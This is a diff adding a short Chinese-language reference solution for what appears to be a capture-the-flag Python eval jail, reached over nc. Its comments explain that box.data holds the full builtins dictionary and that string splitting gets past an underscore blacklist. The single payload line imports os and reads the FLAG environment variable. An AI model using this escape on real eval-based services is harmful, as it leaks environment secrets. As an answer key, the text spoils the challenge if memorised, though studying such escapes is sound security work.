@@ -1,0 +1,5 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+# box.data 就是完整的 __builtins__ dict，
+# 普通属性点号访问绕过一切下划线黑名单
+box.data['__i'+'mport__']('o'+'s').__dict__['envi'+'ron']['F'+'LAG']
